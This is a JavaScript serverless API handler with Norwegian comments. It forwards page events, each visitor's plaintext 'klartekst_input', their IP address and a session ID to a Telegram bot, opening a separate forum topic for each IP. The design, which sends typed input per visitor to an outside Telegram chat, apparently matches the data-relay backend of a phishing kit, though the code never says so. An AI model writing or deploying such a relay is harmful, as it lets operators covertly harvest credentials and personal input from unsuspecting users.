// api/log_data.js
import crypto from 'crypto';

// Telegram Bot API konfigurasjon
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må være en supergruppe for topics)

// Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
// I produksjon kan du bruke en database i stedet
const ipToTopicMap = new Map();

/**
 * Sjekker om et topic allerede eksisterer for en IP-adresse
 * Sjekker gjennom alle topics i supergruppen (med paginering)
 */
async function findExistingTopicForIP(ipAddress) {
  try {
    const topicName = `IP: ${ipAddress}`;
    let offset = 0;
    const limit = 100;
    let hasMore = true;

    // Sjekk gjennom alle topics med paginering
    while (hasMore) {
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;
      
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          offset: offset,
          limit: limit,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        // Hvis API ikke støtter getForumTopics eller feiler, returner null
        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
        return null;
      }

      const result = await response.json();
      
      if (result.ok && result.result && result.result.topics) {
        // Søk etter et topic med samme navn
        const existingTopic = result.result.topics.find(
          topic => topic.name === topicName
        );
        
        if (existingTopic) {
          console.log(`Fant eksisterende topic for IP ${ipAddress}: ${existingTopic.message_thread_id}`);
          return existingTopic.message_thread_id;
        }

        // Sjekk om det er flere topics å hente
        if (result.result.topics.length < limit) {
          hasMore = false;
        } else {
          offset += limit;
        }
      } else {
        hasMore = false;
      }
    }
    
    return null;
  } catch (error) {
    console.error(`Feil ved søk etter eksisterende topic for IP ${ipAddress}:`, error);
    return null;
  }
}

/**
 * Oppretter eller henter topic ID for en IP-adresse
 * Hvis det er en ny IP, oppretter vi et nytt topic i supergruppen
 */
async function getOrCreateTopicForIP(ipAddress) {
  // Først sjekk om vi har det i cache (for denne invokasjonen)
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  // Sjekk om et topic allerede eksisterer i supergruppen
  const existingTopicId = await findExistingTopicForIP(ipAddress);
  if (existingTopicId) {
    ipToTopicMap.set(ipAddress, existingTopicId);
    return existingTopicId;
  }

  // Hvis ingen eksisterende topic, opprett et nytt
  try {
    const topicId = await createTopicForIP(ipAddress);
    ipToTopicMap.set(ipAddress, topicId);
    return topicId;
  } catch (error) {
    console.error(`Kunne ikke opprette topic for IP ${ipAddress}:`, error);
    
    // Hvis feilen indikerer at topic allerede eksisterer, prøv å finne det igjen
    if (error.message && error.message.includes('already exists')) {
      console.log(`Topic eksisterer allerede for IP ${ipAddress}, søker på nytt...`);
      const existingTopicId = await findExistingTopicForIP(ipAddress);
      if (existingTopicId) {
        ipToTopicMap.set(ipAddress, existingTopicId);
        return existingTopicId;
      }
    }
    
    // Fallback: bruk null (ingen topic) hvis opprettelse feiler
    return null;
  }
}

/**
 * Oppretter et nytt topic i supergruppen for en IP-adresse
 */
async function createTopicForIP(ipAddress) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;
  
  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      name: `IP: ${ipAddress}`,
      icon_color: 0x6FB9F0, // Blå farge
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    
    // Hvis topic allerede eksisterer (selv om vi ikke fant det), prøv å finne det igjen
    if (errorData.description && errorData.description.includes('already exists')) {
      console.log(`Topic for IP ${ipAddress} eksisterer allerede, søker etter det...`);
      const existingTopicId = await findExistingTopicForIP(ipAddress);
      if (existingTopicId) {
        return existingTopicId;
      }
    }
    
    // Hvis topics ikke er støttet, returner null
    if (errorData.error_code === 400) {
      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
    }
    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
  }

  const result = await response.json();
  console.log(`Opprettet nytt topic for IP ${ipAddress}: ${result.result.message_thread_id}`);
  return result.result.message_thread_id;
}

/**
 * Sender en melding til Telegram (i et topic hvis topicId er gitt)
 */
async function sendToTelegram(chatId, message, topicId = null) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML', // Bruker HTML for formatering
  };

  // Hvis topicId er gitt, legg til message_thread_id for å sende til riktig topic
  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }
  
  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
  }

  return await response.json();
}

/**
 * Formaterer data til en lesbar Telegram-melding
 */
function formatTelegramMessage(data, isNewIPAddress = false) {
  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;
  
  let message = '';
  
  // Hvis dette er en ny IP-adresse, legg til en velkomstmelding
  if (isNewIPAddress) {
    message += `🆕 <b>Ny bruker opprettet</b>\n`;
    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  // Standard aktivitetsmelding
  message += `🔔 <b>Aktivitet</b>\n`;
  message += `📄 <b>Side:</b> ${page || 'Ukjent'}\n`;
  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;
  
  if (klartekst_input) {
    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
  }
  
  if (session_uid) {
    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
  }
  
  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;
  
  return message;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Kun POST er tillatt' });
  }

  try {
    // Valider at Telegram-konfigurasjonen er satt
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
    }

    const { page, event_description, klartekst_input, session_uid: client_session_uid } = req.body;
    
    // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip_adresse = forwardedFor 
      ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
      : req.headers['x-real-ip'] || req.socket.remoteAddress || 'Ukjent IP';

    let session_uid = client_session_uid;

    // Hvis klientsiden ikke sendte en UID, generer en ny
    if (!session_uid) {
      session_uid = crypto.randomUUID();
      console.log('Genererte ny session_uid på serveren:', session_uid);
    } else {
      console.log('Mottok session_uid fra klienten:', session_uid);
    }

    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
    
    // Hent eller opprett topic for denne IP-adressen
    const topicId = await getOrCreateTopicForIP(ip_adresse);

    // Formater meldingen (inkluderer spesiell header hvis ny IP)
    const message = formatTelegramMessage({
      page,
      event_description,
      klartekst_input,
      ip_adresse,
      session_uid,
    }, isNewIPAddress);

    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
    await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);

    console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);

    res.status(200).json({ 
      message: 'Data sendt til Telegram!', 
      session_uid: session_uid,
      ip_adresse: ip_adresse 
    });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ message: `Serverfeil: ${error.message}` });
  }
}
